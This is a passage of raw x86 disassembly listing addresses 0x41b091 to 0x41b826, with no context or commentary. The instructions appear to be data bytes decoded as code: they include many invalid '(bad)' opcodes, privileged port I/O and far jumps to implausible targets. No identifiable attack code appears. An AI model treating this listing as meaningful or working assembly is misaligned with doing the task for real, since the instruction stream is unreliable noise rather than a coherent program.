  41b091:	fdivr  DWORD PTR [esi-0x184bfae]
  41b097:	fadd   QWORD PTR [edi]
  41b099:	or     al,0x3a
  41b09b:	js     0x41b108
  41b09d:	cmp    DWORD PTR [ebp+0x28e5afba],eax
  41b0a3:	lods   eax,DWORD PTR ds:[esi]
  41b0a4:	sbb    DWORD PTR [eax-0xd978bf7],0x12
  41b0ab:	jg     0x41b02d
  41b0ad:	test   bl,bl
  41b0af:	jnp    0x41b12b
  41b0b1:	cmp    DWORD PTR [ecx+esi*2+0x5be9866f],ebp
  41b0b8:	addr16 mov esi,0xd9ce33b9
  41b0be:	cmp    eax,0xa268afc7
  41b0c3:	sbb    dh,dl
  41b0c5:	out    dx,al
  41b0c6:	mov    al,ds:0x17792e4a
  41b0cb:	jl     0x41b0e7
  41b0cd:	dec    esi
  41b0ce:	retf   
  41b0cf:	dec    ecx
  41b0d0:	adc    ah,BYTE PTR [edx-0x60]
  41b0d3:	mov    ebp,0xb691a1b5
  41b0d8:	(bad)  
  41b0d9:	out    0xc,eax
  41b0db:	push   es
  41b0dc:	push   esp
  41b0dd:	mov    dh,0x1f
  41b0df:	mov    edx,0x5aaa0cfb
  41b0e4:	call   0x5296:0xafb8b270
  41b0eb:	adc    bl,BYTE PTR [edx+edi*8-0x2a13d6bb]
  41b0f2:	test   eax,0x7427b1e6
  41b0f7:	mov    ebp,0xa3c67c3
  41b0fc:	xor    BYTE PTR [edi],cl
  41b0fe:	hlt    
  41b0ff:	dec    ebp
  41b100:	aam    0xc2
  41b102:	ds jle 0x41b090
  41b105:	jg     0x41b0da
  41b107:	add    BYTE PTR [edx],al
  41b109:	dec    edx
  41b10a:	test   al,0x5a
  41b10c:	aas    
  41b10d:	dec    esi
  41b10e:	call   0x78845e6e
  41b113:	dec    edx
  41b114:	push   es
  41b115:	outs   dx,DWORD PTR ds:[esi]
  41b116:	inc    ecx
  41b117:	ret    0x482
  41b11a:	inc    esi
  41b11b:	jne    0x41b10f
  41b11d:	bound  ecx,QWORD PTR [ebx]
  41b11f:	mov    edx,0xff825ce1
  41b124:	jnp    0x41b0e1
  41b126:	jnp    0x41b191
  41b128:	sub    ebp,esp
  41b12a:	jno    0x41b148
  41b12c:	adc    dl,BYTE PTR [esi-0x8]
  41b12f:	shr    BYTE PTR [ecx+eax*4+0x28],cl
  41b133:	nop
  41b134:	mov    al,ds:0xbcf51103
  41b139:	dec    eax
  41b13a:	cmp    al,ch
  41b13c:	cmp    DWORD PTR ds:0xcd5fc7f0,edi
  41b142:	cmp    BYTE PTR [eax-0x6a],bh
  41b145:	mov    ds:0xc279739f,al
  41b14a:	xor    bh,cl
  41b14c:	shl    DWORD PTR [esi+0x52],0xa5
  41b150:	test   DWORD PTR [esp+edi*1],0xb441dbe1
  41b157:	xor    al,0xc3
  41b159:	test   DWORD PTR [ecx-0x78],ebp
  41b15c:	mov    dh,0xbf
  41b15e:	add    al,0xd4
  41b160:	add    ch,al
  41b162:	push   edi
  41b163:	and    BYTE PTR [ecx],al
  41b165:	lods   eax,DWORD PTR ds:[esi]
  41b166:	in     eax,0xb5
  41b168:	cs inc ebp
  41b16a:	leave  
  41b16b:	adc    BYTE PTR [esi+esi*4],cl
  41b16e:	xor    DWORD PTR [ecx+edx*8+0x128b8405],0x3610eae
  41b179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b17a:	imul   ecx,DWORD PTR [ebp-0x1a782bae],0xc20a4ce
  41b184:	dec    ebx
  41b185:	push   0x245fcb05
  41b18a:	imul   ebx,DWORD PTR [ebx+ecx*1+0x3a],0x60720788
  41b192:	inc    esp
  41b193:	mov    cl,0x3c
  41b195:	pop    esp
  41b196:	bnd ja 0x41b186
  41b199:	sub    al,0xb4
  41b19b:	fwait
  41b19c:	int3   
  41b19d:	in     eax,dx
  41b19e:	xchg   ebx,eax
  41b19f:	into   
  41b1a0:	mov    eax,ds:0x13d4fe04
  41b1a5:	fucom  st(3)
  41b1a7:	jge    0x41b1fb
  41b1a9:	xchg   ecx,eax
  41b1aa:	mov    ch,0x33
  41b1ac:	sub    al,0xea
  41b1ae:	ds jne 0x41b1c5
  41b1b1:	jmp    0x41b1ad
  41b1b3:	daa    
  41b1b4:	pushf  
  41b1b5:	mov    bl,0xb8
  41b1b7:	xchg   edx,eax
  41b1b8:	xchg   BYTE PTR [edx+0x7736cd4e],bh
  41b1be:	mov    ds:0xce180120,al
  41b1c3:	(bad)  
  41b1c4:	pop    eax
  41b1c5:	sub    BYTE PTR [esi],cl
  41b1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1c8:	fmulp  st(2),st
  41b1ca:	cmp    al,0x4
  41b1cc:	sti    
  41b1cd:	dec    ebp
  41b1ce:	mov    bl,0x97
  41b1d0:	pop    es
  41b1d1:	mov    WORD PTR [eax+edx*2+0x3cc8234d],ds
  41b1d8:	dec    ecx
  41b1d9:	mov    BYTE PTR [ecx-0x2f468b96],bh
  41b1df:	mov    al,0x30
  41b1e1:	bound  edx,QWORD PTR [eax+0x60]
  41b1e4:	pop    edx
  41b1e5:	loope  0x41b1b5
  41b1e7:	push   eax
  41b1e8:	jl     0x41b187
  41b1ea:	or     DWORD PTR [ebp+0x23ff102f],edi
  41b1f0:	mov    esi,0xd64dff5b
  41b1f5:	sbb    eax,0xdf0701bd
  41b1fa:	aaa    
  41b1fb:	aam    0x3d
  41b1fd:	test   eax,0xcb88ea59
  41b202:	xchg   DWORD PTR [edi-0x5121a972],esi
  41b208:	and    DWORD PTR [edi+edx*4],eax
  41b20b:	pop    esp
  41b20c:	inc    esi
  41b20d:	fcmove st,st(0)
  41b20f:	bnd jae 0x41b1bd
  41b212:	adc    eax,0xfb0b751a
  41b217:	mov    ebp,0x7073be13
  41b21c:	(bad)  
  41b21d:	stos   DWORD PTR es:[edi],eax
  41b21e:	inc    edi
  41b21f:	and    BYTE PTR [eax],ch
  41b221:	enter  0xdd56,0x84
  41b225:	loop   0x41b298
  41b227:	mov    ds,WORD PTR [ebx-0xc99bd26]
  41b22d:	inc    edx
  41b22e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b22f:	mov    ebp,0xed026903
  41b234:	adc    ah,dl
  41b236:	xchg   ebp,eax
  41b237:	(bad)  
  41b238:	(bad)  [ebx+0x16388393]
  41b23e:	iret   
  41b23f:	add    dh,0xfb
  41b242:	push   eax
  41b243:	add    eax,0xb25753d0
  41b248:	shl    DWORD PTR [ebx],cl
  41b24a:	aam    0xc
  41b24c:	retf   
  41b24d:	repz (bad) 
  41b24f:	push   cs
  41b250:	dec    esi
  41b251:	into   
  41b252:	dec    edx
  41b253:	sub    al,0x8a
  41b255:	in     al,0xa
  41b257:	int    0xc
  41b259:	push   es
  41b25a:	mov    ds:0xad4512e7,eax
  41b25f:	out    dx,al
  41b260:	ret    0x57cf
  41b263:	mov    ds:0x848d668e,al
  41b268:	fbld   TBYTE PTR [ecx-0x194f42f5]
  41b26e:	cs jnp 0x41b232
  41b271:	loope  0x41b296
  41b273:	add    BYTE PTR [ebx-0x2dc7e417],al
  41b279:	jmp    0x96cdd4a
  41b27e:	push   ss
  41b27f:	retf   0x1b2a
  41b282:	lds    ebx,FWORD PTR [ecx-0x7937659c]
  41b288:	aad    0x45
  41b28a:	dec    ebx
  41b28b:	rol    BYTE PTR [ebp-0x3b],cl
  41b28e:	pop    ds
  41b28f:	xchg   esi,eax
  41b290:	jo     0x41b29e
  41b292:	test   BYTE PTR [ebp+0xe13d9da],dh
  41b298:	push   ebx
  41b299:	add    edx,DWORD PTR [edx-0x4d]
  41b29c:	dec    ebx
  41b29d:	pusha  
  41b29e:	dec    esp
  41b29f:	xor    bp,WORD PTR [edx]
  41b2a2:	push   esp
  41b2a3:	jecxz  0x41b25c
  41b2a5:	dec    eax
  41b2a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2a7:	push   ds
  41b2a8:	inc    ecx
  41b2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2aa:	adc    DWORD PTR [esi+0x516ddd59],eax
  41b2b0:	or     esp,esi
  41b2b2:	pop    ecx
  41b2b3:	mov    ebp,0x852b9c39
  41b2b8:	sbb    eax,0xcbdcea76
  41b2bd:	pusha  
  41b2be:	in     al,dx
  41b2bf:	std    
  41b2c0:	js     0x41b322
  41b2c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2c3:	out    0xef,eax
  41b2c5:	and    eax,0x2a062ab4
  41b2ca:	imul   esp,DWORD PTR [ebx+0x5fccd8eb],0x59
  41b2d1:	sub    al,0x25
  41b2d3:	cmp    DWORD PTR [ecx+ebx*2],edx
  41b2d6:	jecxz  0x41b291
  41b2d8:	rcr    DWORD PTR [eax],1
  41b2da:	jl     0x41b2dd
  41b2dc:	test   BYTE PTR [ecx+0x3e2bba2e],ch
  41b2e2:	sub    eax,0xb0bea318
  41b2e7:	pop    es
  41b2e8:	mov    fs,WORD PTR [edi]
  41b2ea:	sub    BYTE PTR [eax+eiz*4],bh
  41b2ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2ee:	mov    ebp,ecx
  41b2f0:	pop    es
  41b2f1:	pop    ebx
  41b2f2:	inc    eax
  41b2f3:	fbstp  TBYTE PTR ds:0x7972f87
  41b2f9:	push   0xffffffeb
  41b2fb:	shr    esi,cl
  41b2fd:	mov    cl,0xe7
  41b2ff:	outs   dx,DWORD PTR ds:[esi]
  41b300:	sbb    BYTE PTR [ebx+0x7d],ch
  41b303:	loope  0x41b2ea
  41b305:	jae    0x41b37d
  41b307:	repz int3 
  41b309:	add    dh,0x4d
  41b30c:	pop    eax
  41b30d:	enter  0x21de,0xe7
  41b311:	or     esp,edi
  41b313:	adc    al,0x6
  41b315:	mov    edi,0x54af8794
  41b31a:	cwde   
  41b31b:	sub    esp,eax
  41b31d:	fucomi st,st(6)
  41b31f:	stos   DWORD PTR es:[edi],eax
  41b320:	cmp    DWORD PTR [edx+0x34],ebp
  41b323:	sbb    BYTE PTR [eax+0x1e168d76],ch
  41b329:	xor    ebp,DWORD PTR [ebp-0x49]
  41b32c:	popa   
  41b32d:	jmp    0x5a6:0xd956d4cb
  41b334:	jnp    0x41b316
  41b336:	or     BYTE PTR [esi-0x6d7a584],ah
  41b33c:	in     eax,dx
  41b33d:	mov    ch,0x1b
  41b33f:	aaa    
  41b340:	stc    
  41b341:	test   eax,0xb4a485ef
  41b346:	fst    DWORD PTR [ecx+0x70da5393]
  41b34c:	or     ebx,DWORD PTR [ecx+0x2f436ba3]
  41b352:	inc    esp
  41b353:	mov    ecx,0x3211dbcd
  41b358:	loope  0x41b3d8
  41b35a:	je     0x41b38f
  41b35c:	fs dec ecx
  41b35e:	arpl   dx,bp
  41b360:	pop    ebp
  41b361:	mov    bl,0x74
  41b363:	out    dx,al
  41b364:	adc    DWORD PTR [esi-0x30],0x6f
  41b368:	arpl   WORD PTR [ebx],bp
  41b36a:	ret    
  41b36b:	scas   eax,DWORD PTR es:[edi]
  41b36c:	mov    fs,esi
  41b36e:	not    eax
  41b370:	jae    0x41b2f5
  41b372:	ins    BYTE PTR es:[edi],dx
  41b373:	xchg   ebp,eax
  41b374:	mov    bl,BYTE PTR [edi]
  41b376:	packsswb mm4,QWORD PTR [edi+0x6a]
  41b37a:	cmp    eax,0x83fad07d
  41b37f:	push   ecx
  41b380:	mov    BYTE PTR [eax-0x73],dl
  41b383:	repnz loope 0x41b35d
  41b386:	mov    al,0xf4
  41b388:	shl    DWORD PTR [ecx],0x7b
  41b38b:	or     al,0x25
  41b38d:	xlat   BYTE PTR ds:[ebx]
  41b38e:	xchg   esi,eax
  41b38f:	test   eax,0x3dd19f56
  41b394:	jb     0x41b3bf
  41b396:	enter  0xf51d,0xe4
  41b39a:	test   BYTE PTR [ecx+0xf],bh
  41b39d:	jge    0x41b32c
  41b39f:	sub    eax,0x2076e5d8
  41b3a4:	sub    WORD PTR ds:0x4430992d,bx
  41b3ab:	xchg   BYTE PTR [eax+0x61],bh
  41b3ae:	dec    edi
  41b3af:	mov    dh,0xe6
  41b3b1:	xor    bh,BYTE PTR [ecx+0x10dcf85d]
  41b3b7:	test   eax,0x65e515b0
  41b3bc:	sub    BYTE PTR ss:[ebp+0x11],bl
  41b3c0:	adc    eax,0x7938c797
  41b3c5:	add    ebp,esp
  41b3c7:	retf   
  41b3c8:	add    al,0x61
  41b3ca:	pop    edx
  41b3cb:	ins    DWORD PTR es:[edi],dx
  41b3cc:	mov    ebp,0x8e8f2244
  41b3d1:	ror    DWORD PTR [edx+eax*4],0x34
  41b3d5:	pop    ebx
  41b3d6:	rcl    DWORD PTR [edx+eax*8+0x29],1
  41b3da:	hlt    
  41b3db:	stos   DWORD PTR es:[edi],eax
  41b3dc:	lods   eax,DWORD PTR ds:[esi]
  41b3dd:	je     0x41b3ad
  41b3df:	jae    0x41b407
  41b3e1:	lods   eax,DWORD PTR ds:[esi]
  41b3e2:	iret   
  41b3e3:	addr16 lock mov eax,0x596047c0
  41b3ea:	enter  0x183a,0x89
  41b3ee:	cmp    al,0x29
  41b3f0:	cli    
  41b3f1:	xchg   esp,edx
  41b3f3:	pop    ebx
  41b3f4:	jb     0x41b432
  41b3f6:	(bad)  
  41b3f7:	popf   
  41b3f8:	inc    ebx
  41b3f9:	dec    esp
  41b3fa:	(bad)  
  41b3fc:	ds aaa 
  41b3fe:	mov    esi,0x12ff633b
  41b403:	jl     0x41b3d5
  41b405:	jecxz  0x41b479
  41b407:	lods   al,BYTE PTR ds:[esi]
  41b408:	mov    ds:0x6b3db6fa,al
  41b40d:	out    0x20,eax
  41b40f:	shr    bh,cl
  41b411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b412:	mov    dh,0xff
  41b414:	ss retf 0xf89c
  41b418:	pop    es
  41b419:	stos   DWORD PTR es:[edi],eax
  41b41a:	stc    
  41b41b:	fadd   QWORD PTR [ecx]
  41b41d:	adc    ch,bl
  41b41f:	stos   BYTE PTR es:[edi],al
  41b420:	jns    0x41b3e7
  41b422:	xchg   ecx,eax
  41b423:	rcl    DWORD PTR [esi],1
  41b425:	add    al,0x5d
  41b427:	hlt    
  41b428:	add    eax,0x77e4417
  41b42d:	push   edi
  41b42e:	inc    esi
  41b42f:	push   ecx
  41b430:	mov    esi,0x3201a627
  41b435:	lock cwde 
  41b437:	adc    BYTE PTR [ebx+edi*1],ch
  41b43a:	shl    dl,0x9
  41b43d:	xchg   esi,eax
  41b43e:	call   0xfb2b5d3d
  41b443:	push   ecx
  41b444:	loopne 0x41b3e0
  41b446:	xchg   ebx,eax
  41b447:	mov    ss,WORD PTR [ebp-0xf265dbc]
  41b44d:	sub    ch,BYTE PTR cs:[esi+0x4d198c4f]
  41b454:	jmp    0xb12b:0x23ba18c5
  41b45b:	adc    eax,0xaca3753c
  41b460:	add    ebp,edi
  41b462:	mov    al,ds:0xceeed490
  41b467:	icebp  
  41b468:	scas   al,BYTE PTR es:[edi]
  41b469:	ins    BYTE PTR es:[edi],dx
  41b46a:	std    
  41b46b:	and    eax,0x5f06cbfc
  41b470:	cmp    ebp,DWORD PTR [ebx]
  41b472:	imul   ebx,eax,0x7e
  41b475:	(bad)  
  41b476:	fadd   DWORD PTR [ebp+0x16]
  41b479:	inc    ecx
  41b47a:	xchg   ecx,eax
  41b47b:	sahf   
  41b47c:	jmp    0xa5771e51
  41b481:	dec    esp
  41b482:	test   eax,0x5f6c5e85
  41b487:	xchg   esp,eax
  41b488:	iret   
  41b489:	push   0xf4a46401
  41b48e:	stc    
  41b48f:	das    
  41b490:	retf   0xa15
  41b493:	test   eax,0x3c07f073
  41b498:	xchg   ebx,eax
  41b499:	inc    eax
  41b49a:	mov    bh,0xc2
  41b49c:	nop
  41b49d:	js     0x41b4d0
  41b49f:	push   ebx
  41b4a0:	and    bh,dl
  41b4a2:	sub    eax,0x81c3c153
  41b4a7:	xor    eax,0xf1639eea
  41b4ac:	adc    bh,BYTE PTR [edx]
  41b4ae:	jmp    0x8e2:0x8ca66179
  41b4b5:	inc    ebp
  41b4b6:	hlt    
  41b4b7:	xor    ecx,esi
  41b4b9:	and    cl,BYTE PTR [edx]
  41b4bb:	ss push 0x29
  41b4be:	ret    
  41b4bf:	pop    ebx
  41b4c0:	aad    0xfa
  41b4c2:	dec    ebp
  41b4c3:	addr16 popf 
  41b4c5:	mov    al,0x37
  41b4c7:	add    DWORD PTR [eax-0x5],eax
  41b4ca:	mov    bh,0xd8
  41b4cc:	outs   dx,DWORD PTR ds:[esi]
  41b4cd:	lfs    edx,FWORD PTR [ebx-0x45270260]
  41b4d4:	stc    
  41b4d5:	add    eax,0x91c621c3
  41b4da:	scas   al,BYTE PTR es:[edi]
  41b4db:	jl     0x41b50e
  41b4dd:	imul   eax,DWORD PTR [esp+edx*2-0x52c6a8d4],0x15
  41b4e5:	mov    al,ds:0xf751167
  41b4ea:	fcomp  QWORD PTR [ebp+0x7a]
  41b4ed:	jne    0x41b501
  41b4ef:	push   eax
  41b4f0:	sbb    DWORD PTR [ebp-0x9a59120],ebp
  41b4f6:	ja     0x41b4d5
  41b4f8:	push   ecx
  41b4f9:	loopne 0x41b56c
  41b4fb:	ds inc edx
  41b4fd:	xchg   DWORD PTR [ebx-0x32a8b6cb],edx
  41b503:	sub    eax,0x2d45164b
  41b508:	adc    ah,BYTE PTR [edi-0x767024f0]
  41b50e:	pushf  
  41b50f:	mov    dl,0xc8
  41b511:	cli    
  41b512:	not    BYTE PTR [edi]
  41b514:	pushf  
  41b515:	push   esi
  41b516:	out    0xd2,eax
  41b518:	mov    esi,DWORD PTR [edi-0x46af6166]
  41b51e:	and    DWORD PTR [edi+edx*2],esi
  41b521:	fs retf 0x9849
  41b525:	and    al,0xf3
  41b527:	xchg   edx,eax
  41b528:	sub    eax,0x86be0517
  41b52d:	cs jp  0x41b510
  41b530:	inc    ecx
  41b531:	fsubp  st(1),st
  41b533:	mov    ds:0xd515e978,al
  41b538:	dec    edx
  41b539:	stos   DWORD PTR es:[edi],eax
  41b53a:	cdq    
  41b53b:	fnstenv [ebx+0x18f42db]
  41b541:	and    ebx,DWORD PTR ds:0xe0029655
  41b547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b548:	stc    
  41b549:	lea    ebx,[esi]
  41b54b:	mov    ecx,0x287f5ab7
  41b550:	int3   
  41b551:	push   ebp
  41b552:	jmp    0xed8aa9db
  41b557:	pop    eax
  41b558:	scas   al,BYTE PTR es:[edi]
  41b559:	add    DWORD PTR [ecx-0x6d],edi
  41b55c:	cmp    cl,BYTE PTR [eax+ecx*8-0x7e3a0f4e]
  41b563:	ja     0x41b5df
  41b565:	add    DWORD PTR [esi-0x1b],ebp
  41b568:	retf   0x3173
  41b56b:	pushf  
  41b56c:	inc    esp
  41b56d:	mov    ebp,esi
  41b56f:	add    eax,0x833932ca
  41b574:	int    0xeb
  41b576:	jbe    0x41b50c
  41b578:	loope  0x41b53a
  41b57a:	rol    DWORD PTR [edx+0x6ae12273],1
  41b580:	pusha  
  41b581:	pop    esp
  41b582:	or     DWORD PTR [ebp+eax*2-0x5b],0xfffffffe
  41b587:	scas   al,BYTE PTR es:[edi]
  41b588:	mov    dl,0xb0
  41b58a:	pop    es
  41b58b:	push   ss
  41b58c:	in     eax,dx
  41b58d:	jmp    0x5018e4be
  41b592:	out    dx,eax
  41b593:	and    al,0x1c
  41b595:	ds (bad) 
  41b597:	(bad)  
  41b599:	mov    al,0xde
  41b59b:	clc    
  41b59c:	arpl   WORD PTR [esi-0x2140fb61],bp
  41b5a2:	cmp    edx,DWORD PTR [ebp+ebp*8+0x6aa6f6c5]
  41b5a9:	push   eax
  41b5aa:	rcr    BYTE PTR [edx+0x5b],1
  41b5ad:	lods   eax,DWORD PTR ds:[esi]
  41b5ae:	sub    eax,0x2be9b499
  41b5b3:	dec    esi
  41b5b4:	stos   BYTE PTR es:[edi],al
  41b5b5:	pushf  
  41b5b6:	(bad)  
  41b5b7:	mov    ebp,0xf84eef9f
  41b5bc:	and    eax,0xb4af3acb
  41b5c1:	fisubr DWORD PTR [esi+0x10]
  41b5c4:	inc    ebx
  41b5c5:	js     0x41b5ea
  41b5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5c8:	pushf  
  41b5c9:	mov    cl,0x2a
  41b5cb:	sub    dl,ch
  41b5cd:	out    0x9b,al
  41b5cf:	bound  ebp,QWORD PTR [ebx+esi*1+0x6c]
  41b5d3:	or     ebx,0x63
  41b5d6:	add    al,0x12
  41b5d8:	xor    al,0x7f
  41b5da:	fbld   TBYTE PTR [ebx+eax*2-0x381111f7]
  41b5e1:	imul   esi,DWORD PTR [eax+edi*1+0x2d],0x2b
  41b5e6:	aaa    
  41b5e7:	sbb    BYTE PTR [ecx],al
  41b5e9:	js     0x41b588
  41b5eb:	das    
  41b5ec:	pop    ecx
  41b5ed:	ds or  al,0x99
  41b5f0:	test   al,0x9e
  41b5f2:	add    BYTE PTR [edx+eiz*1-0xa],ah
  41b5f6:	push   0xc488d2dd
  41b5fb:	pop    edx
  41b5fc:	sub    eax,0x10d93670
  41b601:	adc    bh,BYTE PTR [ebx]
  41b603:	adc    ebx,DWORD PTR es:[ecx+0x71f3a600]
  41b60a:	push   edx
  41b60b:	gs push edi
  41b60d:	ds cld 
  41b60f:	ins    DWORD PTR es:[edi],dx
  41b610:	ficomp DWORD PTR [esi+0x7a23dbf7]
  41b616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b617:	mov    bl,0xf2
  41b619:	ja     0x41b689
  41b61b:	inc    ebx
  41b61c:	test   eax,0x23f1057
  41b621:	cs jg  0x41b5af
  41b624:	pop    ecx
  41b625:	sbb    eax,0x382090b2
  41b62a:	push   eax
  41b62b:	imul   edx,DWORD PTR [esi],0xffffffc1
  41b62e:	mov    ds,WORD PTR [ebx+0x41]
  41b631:	mov    edx,cs
  41b633:	xchg   ebp,eax
  41b634:	push   ss
  41b635:	sbb    ch,BYTE PTR [esi-0x59]
  41b638:	dec    eax
  41b639:	dec    edi
  41b63a:	out    dx,eax
  41b63b:	aad    0x72
  41b63d:	dec    ebp
  41b63e:	pop    esp
  41b63f:	ss jecxz 0x41b60c
  41b642:	jno    0x41b6a6
  41b644:	xchg   BYTE PTR [edx+0x36],cl
  41b647:	sub    esi,DWORD PTR [esi+0x150c6d7]
  41b64d:	dec    edx
  41b64e:	and    dh,BYTE PTR [eax+0x7626792b]
  41b654:	dec    ebp
  41b655:	stos   DWORD PTR es:[edi],eax
  41b656:	add    eax,0x1c920fff
  41b65b:	jb     0x41b5f7
  41b65d:	dec    edi
  41b65e:	mov    DWORD PTR ds:0x50aea9f5,edi
  41b664:	sbb    BYTE PTR [eax+0x84eed3],ch
  41b66a:	and    DWORD PTR [eax+0x50],ebx
  41b66d:	mov    esp,0x520e3a21
  41b672:	inc    ebp
  41b673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b674:	arpl   WORD PTR [eax],dx
  41b676:	loope  0x41b6b4
  41b678:	fisubr WORD PTR [ecx]
  41b67a:	mul    BYTE PTR [ecx-0x2a]
  41b67d:	jnp    0x41b65f
  41b67f:	inc    edx
  41b680:	lahf   
  41b681:	push   esi
  41b682:	add    DWORD PTR [ebp+0x51],edi
  41b685:	inc    esi
  41b686:	mov    bl,0x68
  41b688:	clc    
  41b689:	je     0x41b682
  41b68b:	sub    BYTE PTR [edx-0x1ef902b6],dl
  41b691:	dec    esp
  41b692:	gs jl  0x41b6ab
  41b695:	ror    BYTE PTR [esi+0x7d],0x98
  41b699:	in     eax,0x93
  41b69b:	fcmovnu st,st(0)
  41b69d:	dec    edx
  41b69e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b69f:	lock fmul QWORD PTR [edi+0x43]
  41b6a3:	adc    al,BYTE PTR [ebp-0x4f708d17]
  41b6a9:	loop   0x41b718
  41b6ab:	mov    bh,BYTE PTR [eax]
  41b6ad:	(bad)  
  41b6ae:	imul   esp,DWORD PTR [esi],0xffffffae
  41b6b1:	jp     0x41b6ed
  41b6b3:	mov    esp,0x2ad67faa
  41b6b8:	add    al,0x1d
  41b6ba:	hlt    
  41b6bb:	adc    cl,cl
  41b6bd:	das    
  41b6be:	add    BYTE PTR cs:[ebp+0x6aaf6c49],0x24
  41b6c6:	xor    eax,0xc548b6c4
  41b6cb:	pop    eax
  41b6cc:	dec    ecx
  41b6cd:	neg    BYTE PTR [esi+0x165ad3fc]
  41b6d3:	into   
  41b6d4:	(bad)  
  41b6d5:	idiv   BYTE PTR [edx+eiz*1+0x359aea5d]
  41b6dc:	mov    ecx,ebx
  41b6de:	push   edi
  41b6df:	cld    
  41b6e0:	xchg   esi,eax
  41b6e1:	mov    dh,0x69
  41b6e3:	ja     0x41b671
  41b6e5:	imul   ecx,DWORD PTR [ecx+0x7cf36315],0xd4c4efb4
  41b6ef:	mov    dl,0xd7
  41b6f1:	ret    0x60a
  41b6f4:	fnstenv [ebp-0x4c]
  41b6f7:	jae    0x41b6fd
  41b6f9:	int3   
  41b6fa:	popa   
  41b6fb:	jne    0x41b710
  41b6fd:	(bad)  
  41b6fe:	push   ds
  41b6ff:	or     ebp,DWORD PTR [eax+0x1f5aca38]
  41b705:	cmp    al,0x6d
  41b707:	push   edx
  41b708:	add    ah,BYTE PTR [edx-0x292ddb83]
  41b70e:	cmp    BYTE PTR [ecx+0xa],ch
  41b711:	pop    ss
  41b712:	ins    BYTE PTR es:[edi],dx
  41b713:	adc    BYTE PTR [eax+0x5a],ch
  41b716:	shl    dh,cl
  41b718:	fprem  
  41b71a:	ins    DWORD PTR es:[edi],dx
  41b71b:	push   ds
  41b71c:	or     bh,BYTE PTR [ebx+0x41]
  41b71f:	sbb    BYTE PTR [edx-0x2f57e770],cl
  41b725:	repnz stos DWORD PTR es:[edi],eax
  41b727:	popf   
  41b728:	ja     0x41b718
  41b72a:	pusha  
  41b72b:	retf   0x7e7
  41b72e:	aam    0x9d
  41b730:	add    DWORD PTR [eax+0x17],ebx
  41b733:	fcmovbe st,st(6)
  41b735:	add    eax,0x17d0d197
  41b73a:	adc    DWORD PTR [ebx+0x6e32c006],eax
  41b740:	add    ch,al
  41b742:	sahf   
  41b743:	(bad)
  41b746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b747:	test   al,0x90
  41b749:	div    BYTE PTR [edx+0x7d]
  41b74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b74d:	adc    esi,edi
  41b74f:	mov    eax,0x345619ab
  41b754:	retf   0x9cd4
  41b757:	cdq    
  41b758:	mov    dl,0xac
  41b75a:	mov    eax,0x25f7a2f8
  41b75f:	(bad)  
  41b760:	repz mul BYTE PTR [ebx]
  41b763:	in     eax,0xd5
  41b765:	inc    esi
  41b766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b767:	add    bh,BYTE PTR [ecx+0x475d05f]
  41b76d:	cdq    
  41b76e:	pop    esp
  41b76f:	enter  0x3b9,0xcb
  41b773:	or     bl,BYTE PTR [ebp-0x5e]
  41b776:	jmp    0x917e:0xa104c53f
  41b77d:	jb     0x41b71b
  41b77f:	or     esp,DWORD PTR [edi+ecx*1]
  41b782:	inc    edx
  41b783:	lock jecxz 0x41b7de
  41b786:	ins    DWORD PTR es:[edi],dx
  41b787:	imul   edx,DWORD PTR [edi-0x7f],0x1fe6df53
  41b78e:	add    ah,cl
  41b790:	mov    esi,0xe38d8175
  41b795:	int3   
  41b796:	cwde   
  41b797:	mov    dh,0x24
  41b799:	jecxz  0x41b78f
  41b79b:	int3   
  41b79c:	sub    BYTE PTR [ebx+eax*2+0x63],bl
  41b7a0:	jp     0x41b7e4
  41b7a2:	dec    ebp
  41b7a3:	mov    al,0xdd
  41b7a5:	mov    eax,ds:0x4bff4427
  41b7aa:	mov    esp,0x2b5e1647
  41b7af:	into   
  41b7b0:	push   edi
  41b7b1:	add    di,WORD PTR [ecx-0x3c40f9a6]
  41b7b8:	pusha  
  41b7b9:	das    
  41b7ba:	mov    bh,0x1e
  41b7bc:	repz xor BYTE PTR [edi-0x20ec3900],al
  41b7c3:	jg     0x41b82c
  41b7c5:	leave  
  41b7c6:	enter  0x9406,0xfc
  41b7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7cb:	out    0x60,eax
  41b7cd:	cld    
  41b7ce:	jb     0x41b821
  41b7d0:	xchg   edx,eax
  41b7d1:	jnp    0x41b801
  41b7d3:	cwde   
  41b7d4:	inc    edx
  41b7d5:	add    al,0x27
  41b7d7:	in     eax,0x38
  41b7d9:	and    DWORD PTR [ebx+0x5c],edi
  41b7dc:	or     al,0x56
  41b7de:	out    dx,eax
  41b7df:	mov    cl,0x49
  41b7e1:	jb     0x41b7b7
  41b7e3:	mov    al,0x55
  41b7e5:	fild   DWORD PTR [ecx]
  41b7e7:	mov    ds:0x9f0ad084,eax
  41b7ec:	add    al,0x8c
  41b7ef:	mov    bh,BYTE PTR [ebx-0x2f]
  41b7f2:	sub    DWORD PTR [ebx-0x200a2237],0x454751cf
  41b7fc:	cs cmp eax,0xe
  41b800:	mov    dl,0xc8
  41b802:	push   edi
  41b803:	repnz sbb ch,BYTE PTR [eax+0x7e]
  41b807:	mov    WORD PTR [ecx+0x61912924],?
  41b80d:	mov    al,ds:0x404f2ba7
  41b812:	jmp    0x41b7fb
  41b814:	and    cl,0xde
  41b817:	mov    eax,0xa4e799a7
  41b81c:	cmp    dh,al
  41b81e:	aad    0x76
  41b820:	cmp    BYTE PTR [eax-0x3],ch
  41b823:	cmp    esp,ebx
  41b825:	(bad)  
  41b826:	add    al,0x2c
